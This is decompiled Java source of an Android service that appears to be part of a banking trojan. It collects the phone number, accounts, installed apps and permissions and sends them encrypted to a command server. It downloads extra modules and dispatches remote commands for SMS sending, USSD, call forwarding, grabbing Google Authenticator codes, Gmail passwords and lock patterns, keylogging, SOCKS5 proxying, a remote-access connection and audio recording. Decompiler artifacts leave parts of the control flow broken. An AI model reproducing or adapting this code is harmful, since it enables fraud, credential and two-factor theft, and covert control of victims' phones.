/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.telephony.TelephonyManager
 *  android.util.Base64
 *  org.json.JSONObject
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvNetworkConnect$Thread;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import java.io.File;
import java.util.Locale;
import org.json.JSONObject;

public class srvNetworkConnect
extends IntentService {
    utils elephant$ = new utils();
    constants builds$ = new constants();

    public srvNetworkConnect() {
        super("");
    }

    private String decrypt_str(String string) {
        string = "YmM=";
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    /*
     * Unable to fully structure code
     */
    private void a(Context var1_1) {
        var5_2 = new StringBuilder();
        var5_2.append(srvNetworkConnect.class.getSimpleName());
        var5_2.append("   ");
        var7_3 = var5_2.toString();
        var8_4 = new constants();
        var9_5 = this.elephant$.SettingsRead((Context)var1_1, "QQ");
        var10_6 = (TelephonyManager)this.getBaseContext().getSystemService("phone");
        var6_7 = this.elephant$.SettingsRead((Context)var1_1, "AL");
        var11_8 = new JSONObject();
        var2_9 = 1;
        var11_8.put("DM", (Object)var6_7);
        var11_8.put("AD", (Object)"null");
        var11_8.put("BL", (Object)utils.getBatteryLevel((Context)var1_1));
        var11_8.put("TW", (Object)this.elephant$.SettingsRead((Context)var1_1, "AK"));
        var12_10 = "SA";
        var5_2 = utils._exercise((Context)this) != false ? "YmQ=" : "YmM=";
        var5_2 = this.decrypt_str((String)var5_2);
        var11_8.put((String)var12_10, var5_2);
        var11_8.put("SP", (Object)this.elephant$.SettingsRead((Context)var1_1, "SR"));
        var11_8.put("SS", (Object)utils._janet((Context)var1_1));
        var5_2 = "LE";
        var12_10 = new StringBuilder();
        var12_10.append(Locale.getDefault().getLanguage());
        var11_8.put((String)var5_2, (Object)var12_10.toString());
        var12_10 = "SY";
        var5_2 = utils.isAccessibilityServiceEnabled((Context)var1_1, srvAccessibility.class) != false ? "YmQ=" : "YmM=";
        var5_2 = this.decrypt_str((String)var5_2);
        var11_8.put((String)var12_10, var5_2);
        var11_8.put("SM", (Object)utils._delhi((Context)this));
        var11_8.put("ID", var9_5);
        var11_8.put("IS", (Object)this.elephant$.SettingsRead((Context)var1_1, "AG"));
        var12_10 = "NR";
        var5_2 = var1_1.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == 0 ? ((TelephonyManager)var1_1.getSystemService("phone")).getLine1Number() : "";
        var11_8.put((String)var12_10, var5_2);
        var11_8.put("GA", (Object)utils.getAccounts((Context)this));
        var11_8.put("PS", (Object)utils.hasPermission((Context)this, var8_4.pentium$[0]));
        var11_8.put("PC", (Object)utils.hasPermission((Context)this, var8_4.pentium$[1]));
        var11_8.put("PP", (Object)utils.hasPermission((Context)this, var8_4.pentium$[2]));
        var11_8.put("PO", (Object)utils.hasPermission((Context)this, var8_4.pentium$[3]));
        var5_2 = this.elephant$;
        var12_10 = new StringBuilder();
        var12_10.append("jsonCheckBot: ");
        var12_10.append(var11_8.toString());
        var5_2.Log(var7_3, var12_10.toString());
        var5_2 = this.elephant$;
        var12_10 = new StringBuilder();
        var12_10.append("q=info_device&ws=");
        var12_10.append(this.elephant$._grown(var11_8.toString()));
        var5_2 = var5_2._brought((Context)this, var12_10.toString());
        var11_8 = this.elephant$;
        var12_10 = new StringBuilder();
        var12_10.append("jsonCheckBot: ");
        var12_10.append((String)var5_2);
        var11_8.Log(var7_3, var12_10.toString());
        if (var5_2 == null || var5_2.length() < 2 || var5_2.contains("503 Service Unavailable")) {
            var11_8 = this.elephant$.SettingsRead((Context)var1_1, "SB");
            if (var11_8.contains(",")) {
                var12_10 = var11_8.replace(" ", "").split(",");
                var3_11 = ((CharSequence)var12_10).length;
                for (var2_9 = 0; var2_9 < var3_11; ++var2_9) {
                    var11_8 = var12_10[var2_9];
                    if (var11_8.length() <= 5) continue;
                    var13_12 = this.elephant$;
                    var14_13 = new StringBuilder();
                    var14_13.append("Check URL: ");
                    var14_13.append((String)var11_8);
                    var13_12.Log(var7_3, var14_13.toString());
                    if (!this.elephant$._center((String)var11_8).contains("200")) continue;
                    this.elephant$.SettingsWrite((Context)var1_1, "QE", (String)var11_8);
                    var12_10 = this.elephant$;
                    var13_12 = new StringBuilder();
                    var13_12.append("NEW DOMAIN: ");
                    var13_12.append((String)var11_8);
                    var12_10.Log(var7_3, var13_12.toString());
                    var2_9 = 1;
                    break;
                }
            } else {
                var2_9 = 0;
            }
        }
        if (utils.checkNetworkConnection((Context)this)) {
            var11_8 = this.elephant$._basin();
            var12_10 = this.elephant$;
            var13_12 = "**GET_NEW_URL***";
            var14_13 = new StringBuilder();
            var14_13.append("url: ");
            var14_13.append((String)var11_8);
            var12_10.Log((String)var13_12, var14_13.toString());
            if (!var11_8.isEmpty()) {
                this.elephant$.SettingsWrite((Context)this, "QE", (String)var11_8);
            }
        }
        var11_8 = this.elephant$;
        var12_10 = new StringBuilder();
        var12_10.append("EnCryptResponce: ");
        var12_10.append((String)var5_2);
        var11_8.Log(var7_3, var12_10.toString());
        var5_2 = this.elephant$._marina((String)var5_2);
        var11_8 = this.elephant$;
        var12_10 = new StringBuilder();
        var12_10.append("CheckBotRESPONCE: ");
        var12_10.append((String)var5_2);
        var11_8.Log(var7_3, var12_10.toString());
        if (var5_2.contains("get_new_patch") && !var6_7.equals("1")) {
            var1_1 = this.elephant$;
            var5_2 = new JSONObject();
            var5_2.put("ID", var9_5);
            var6_7 = new StringBuilder();
            var6_7.append("q=upgrade_n_patch&ws=");
            var6_7.append(var1_1._grown(var5_2.toString()));
            var5_2 = var1_1._marina(var1_1._brought((Context)this, var6_7.toString()));
            var6_7 = new StringBuilder("Download Module: ");
            var6_7.append(var5_2.length());
            var1_1.Log("downloadModuleDex", var6_7.toString());
            if (var5_2.length() <= 10000) return;
            var1_1.Log("downloadModuleDex", "Save Module");
            var5_2 = Base64.decode((byte[])var5_2.getBytes(), (int)0);
            this.getDir("apk", 0);
            var6_7 = null;
            var1_1.SettingsWrite((Context)this, "AL", "1");
            System.gc();
            return;
        }
        if (var5_2.equals("no_device")) {
            var11_8 = new JSONObject();
            var6_7 = utils.countrySIM((Context)var1_1);
            var5_2 = var6_7;
            if (var6_7.length() != 2) {
                var5_2 = Locale.getDefault().getCountry().toLowerCase();
            }
            var11_8.put("ID", var9_5);
            var11_8.put("AR", (Object)Build.VERSION.RELEASE);
            var11_8.put("TT", (Object)"g\u00c3\u00bcncelleme11");
            var11_8.put("CY", var5_2);
            var11_8.put("OP", (Object)var10_6.getNetworkOperatorName());
            var9_5 = "MD";
            var10_6 = Build.MANUFACTURER;
            var6_7 = Build.MODEL;
            var5_2 = var6_7;
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) {
                var2_9 = utils.getMiuiVersion();
                var5_2 = var6_7;
                if (var2_9 != 0) {
                    var5_2 = new StringBuilder();
                    var5_2.append((String)var6_7);
                    var5_2.append(" MIUI V");
                    var5_2.append(var2_9);
                    var5_2 = var5_2.toString();
                }
            }
            if (var5_2.toLowerCase().startsWith(var10_6.toLowerCase())) {
                var5_2 = utils._premises((String)var5_2);
            } else {
                var6_7 = new StringBuilder();
                var6_7.append(utils._premises((String)var10_6));
                var6_7.append(" ");
                var6_7.append((String)var5_2);
                var5_2 = var6_7.toString();
            }
            var11_8.put((String)var9_5, var5_2);
            var5_2 = this.elephant$;
            var6_7 = new StringBuilder();
            var6_7.append("jsonRegistrationBot: ");
            var6_7.append(var11_8.toString());
            var5_2.Log(var7_3, var6_7.toString());
            var5_2 = this.elephant$;
            var6_7 = this.elephant$;
            var9_5 = new StringBuilder();
            var9_5.append("q=new_device&ws=");
            var9_5.append(this.elephant$._grown(var11_8.toString()));
            var5_2 = var5_2._marina(var6_7._brought((Context)this, var9_5.toString()));
            var5_2.equals("no_reg");
            var6_7 = this.elephant$;
            var9_5 = new StringBuilder();
            var9_5.append("RegistrationRESPONCE: ");
            var9_5.append((String)var5_2);
            var6_7.Log(var7_3, var9_5.toString());
            if (var5_2.equals("ok") == false) return;
            this.elephant$.SettingsWrite((Context)var1_1, "QI", "1");
            return;
        }
        if (var5_2.length() <= 4) return;
        if (!(var5_2 = new JSONObject((String)var5_2)).getString("this").equals("device_no_cmd") || !this.elephant$.SettingsRead((Context)var1_1, "QI").equals("1")) {
            if (var5_2.getString("this").equals("global_settings#")) {
                this.elephant$.Log(var7_3, "global_settings#");
                this.elephant$.SettingsWrite((Context)var1_1, "AG", var5_2.getString("id_settings"));
                if (var5_2.getString("urls").length() > 7) {
                    var6_7 = this.elephant$;
                    var9_5 = "SB";
                    var10_6 = new StringBuilder();
                    var10_6.append(this.elephant$.SettingsRead((Context)var1_1, "QE"));
                    var10_6.append(",");
                    var10_6.append(var5_2.getString("urls"));
                    var6_7.SettingsWrite((Context)var1_1, (String)var9_5, var10_6.toString());
                }
                if (this.elephant$.SettingsRead((Context)var1_1, "AV").equals("-1")) {
                    this.elephant$.Log(var7_3, "Save injection_t");
                    this.elephant$.SettingsWrite((Context)var1_1, "AV", var5_2.getString("injection_t"));
                }
                if (this.elephant$.SettingsRead((Context)var1_1, "AB").equals("-1")) {
                    this.elephant$.Log(var7_3, "Save cards_t");
                    this.elephant$.SettingsWrite((Context)var1_1, "AB", var5_2.getString("cards_t"));
                }
                if (this.elephant$.SettingsRead((Context)var1_1, "AN").equals("-1")) {
                    this.elephant$.Log(var7_3, "Save emails_t");
                    this.elephant$.SettingsWrite((Context)var1_1, "AN", var5_2.getString("emails_t"));
                }
                if (this.elephant$.SettingsRead((Context)var1_1, "SU").equals("-1")) {
                    this.elephant$.Log(var7_3, "Save admin_t");
                    this.elephant$.SettingsWrite((Context)var1_1, "SU", var5_2.getString("admin_t"));
                }
                if (this.elephant$.SettingsRead((Context)var1_1, "SI").equals("-1")) {
                    this.elephant$.Log(var7_3, "Save permission_t");
                    this.elephant$.SettingsWrite((Context)var1_1, "SI", var5_2.getString("permission_t"));
                }
                if (this.elephant$.SettingsRead((Context)var1_1, "SY").equals("-1") == false) return;
                this.elephant$.Log(var7_3, "Save protect_t");
                this.elephant$.SettingsWrite((Context)var1_1, "SY", var5_2.getString("protect_t"));
                return;
            }
            if (var5_2.getString("this").equals("device_settings#")) {
                this.elephant$.Log(var7_3, "get device_settings#");
                this.elephant$.SettingsWrite((Context)var1_1, "AF", var5_2.getString("hideSMS"));
                this.elephant$.SettingsWrite((Context)var1_1, "AZ", var5_2.getString("lockDevice"));
                this.elephant$.SettingsWrite((Context)var1_1, "AX", var5_2.getString("offSound"));
                this.elephant$.SettingsWrite((Context)var1_1, "AC", var5_2.getString("keylogger"));
                this.elephant$.SettingsWrite((Context)var1_1, "QP", var5_2.getString("activeInjection"));
                this.elephant$.SettingsWrite((Context)var1_1, "ES", var5_2.getString("endless_start"));
                this.elephant$.SettingsWrite((Context)var1_1, "WR", var5_2.getString("record_call"));
                return;
            }
            if (var5_2.getString("this").equals("run_cmd") == false) return;
            var6_7 = this.elephant$;
            var9_5 = new StringBuilder();
            var9_5.append("get run_cmd: ");
            var9_5.append(var5_2.toString());
            var6_7.Log(var7_3, var9_5.toString());
            var10_6 = new JSONObject(new String(Base64.decode((String)var5_2.getString("data"), (int)0), "UTF-8"));
            var5_2 = var10_6.getString("cmd");
            switch (var5_2.hashCode()) {
                case 1929950368: {
                    if (!var5_2.equals("patch_update")) break;
                    var2_9 = 26;
                    ** break;
                }
                case 1684567524: {
                    if (!var5_2.equals("call_forward")) break;
                    var2_9 = 3;
                    ** break;
                }
                case 1550329453: {
                    if (!var5_2.equals("run_app")) break;
                    var2_9 = 7;
                    ** break;
                }
                case 1247787042: {
                    if (!var5_2.equals("send_sms")) break;
                    var2_9 = 0;
                    ** break;
                }
                case 1098892172: {
                    if (!var5_2.equals("remove_bot")) break;
                    var2_9 = 11;
                    ** break;
                }
                case 1098891238: {
                    if (!var5_2.equals("remove_app")) break;
                    var2_9 = 9;
                    ** break;
                }
                case 905006723: {
                    if (!var5_2.equals("grabbing_pass_gmail")) break;
                    var2_9 = 17;
                    ** break;
                }
                case 595233003: {
                    if (!var5_2.equals("notification")) break;
                    var2_9 = 4;
                    ** break;
                }
                case 320759922: {
                    if (!var5_2.equals("grabbing_google_authenticator2")) break;
                    var2_9 = 8;
                    ** break;
                }
                case 226593590: {
                    if (!var5_2.equals("get_all_permission")) break;
                    var2_9 = 20;
                    ** break;
                }
                case 151232379: {
                    if (!var5_2.equals("get_data_logs")) break;
                    var2_9 = 5;
                    ** break;
                }
                case 125587325: {
                    if (!var5_2.equals("sms_mailing_phonebook")) break;
                    var2_9 = 10;
                    ** break;
                }
                case 3599727: {
                    if (!var5_2.equals("ussd")) break;
                    var2_9 = 2;
                    ** break;
                }
                case 116079: {
                    if (!var5_2.equals("url")) break;
                    var2_9 = 6;
                    ** break;
                }
                case -203367091: {
                    if (!var5_2.equals("access_notifications")) break;
                    var2_9 = 19;
                    ** break;
                }
                case -272565638: {
                    if (!var5_2.equals("run_admin_device")) break;
                    var2_9 = 15;
                    ** break;
                }
                case -406891602: {
                    if (!var5_2.equals("send_mailing_sms")) break;
                    var2_9 = 1;
                    ** break;
                }
                case -503110523: {
                    if (!var5_2.equals("change_url_recover")) break;
                    var2_9 = 14;
                    ** break;
                }
                case -513200628: {
                    if (!var5_2.equals("clean_cache")) break;
                    var2_9 = 25;
                    ** break;
                }
                case -561690241: {
                    if (!var5_2.equals("request_permission")) break;
                    var2_9 = 16;
                    ** break;
                }
                case -634359797: {
                    if (!var5_2.equals("change_url_connect")) break;
                    var2_9 = 13;
                    ** break;
                }
                case -772676912: {
                    if (!var5_2.equals("rat_connect")) break;
                    var2_9 = 12;
                    ** break;
                }
                case -1138004029: {
                    if (!var5_2.equals("stop_socks5")) break;
                    var2_9 = 22;
                    ** break;
                }
                case -1636193849: {
                    if (!var5_2.equals("update_inject")) break;
                    var2_9 = 23;
                    ** break;
                }
                case -1699446502: {
                    if (!var5_2.equals("run_socks5")) break;
                    var2_9 = 21;
                    ** break;
                }
                case -1787784292: {
                    if (!var5_2.equals("run_record_audio")) break;
                    var2_9 = 24;
                    ** break;
                }
                case -2033081134: {
                    if (!var5_2.equals("grabbing_lockpattern")) break;
                    var2_9 = 18;
                    ** break;
                }
            }
            var2_9 = -1;
lbl410: // 28 sources:
            this.elephant$.SettingsWrite((Context)var1_1, "AL", "0");
            var1_1.getDir("apk", 0);
            return;
        }
        var5_2 = new JSONObject();
        this.elephant$.Log(var7_3, "this device_no_cmd start!");
        var5_2.put("ID", var9_5);
        var5_2.put("AP", (Object)this.elephant$.getInstalledApps((Context)var1_1));
        var6_7 = this.elephant$;
        var9_5 = new StringBuilder();
        var9_5.append("jsonUpdateInj: ");
        var9_5.append(var5_2.toString());
        var6_7.Log(var7_3, var9_5.toString());
        var6_7 = this.elephant$;
        var9_5 = new StringBuilder();
        var9_5.append("q=is_attacker&ws=");
        var9_5.append(this.elephant$._grown(var5_2.toString()));
        var5_2 = var6_7._brought((Context)var1_1, var9_5.toString());
        var5_2 = this.elephant$._marina((String)var5_2);
        var6_7 = this.elephant$;
        var9_5 = new StringBuilder();
        var9_5.append("RESPONCE: ");
        var9_5.append((String)var5_2);
        var6_7.Log(var7_3, var9_5.toString());
        if (var5_2.equals("device_null#") != false) return;
        var4_14 = var5_2.isEmpty();
        if (var4_14 != false) return;
        var6_7 = var5_2.split(":");
        var2_9 = 0;
        do {
            if (var2_9 >= var6_7.length) {
                this.elephant$.SettingsWrite((Context)var1_1, "QU", (String)var5_2);
                this.elephant$.SettingsWrite((Context)var1_1, "QI", "");
                this.elephant$.SettingsWrite((Context)var1_1, "QO", "1");
                this.elephant$.Log(var7_3, "Save Array Injections");
                return;
            }
            if (!var6_7[var2_9].isEmpty()) {
                this.elephant$.SettingsWrite((Context)var1_1, var6_7[var2_9], "");
                var9_5 = this.elephant$;
                var10_6 = new StringBuilder();
                var10_6.append("icon_");
                var10_6.append(var6_7[var2_9]);
                var9_5.SettingsWrite((Context)var1_1, var10_6.toString(), "");
                var9_5 = this.elephant$;
                var10_6 = new StringBuilder();
                var10_6.append("Initialization Injection: ");
                var10_6.append(var6_7[var2_9]);
                var9_5.Log(var7_3, var10_6.toString());
            }
            ++var2_9;
        } while (true);
    }

    protected void onHandleIntent(Intent intent) {
        new Thread(new srvNetworkConnect$Thread(this)).start();
        this.a((Context)this);
        this.stopSelf();
    }
}

